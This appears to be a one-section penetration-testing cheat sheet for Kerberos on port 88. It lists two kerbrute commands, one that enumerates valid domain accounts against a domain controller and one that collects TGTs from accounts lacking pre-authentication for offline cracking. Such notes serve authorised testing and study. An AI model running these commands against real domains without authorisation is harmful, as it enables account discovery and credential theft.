# 88 - Kerberos

```
# validate users
kerbrute userenum --dc 10.10.10.10 -d domain.local users.lst

# validate users and grabbing TGTs if NO PREAUTH is present
kerbrute -domain DOMAIN.LOCAL -users users.txt -dc-ip 10.10.10.175
```
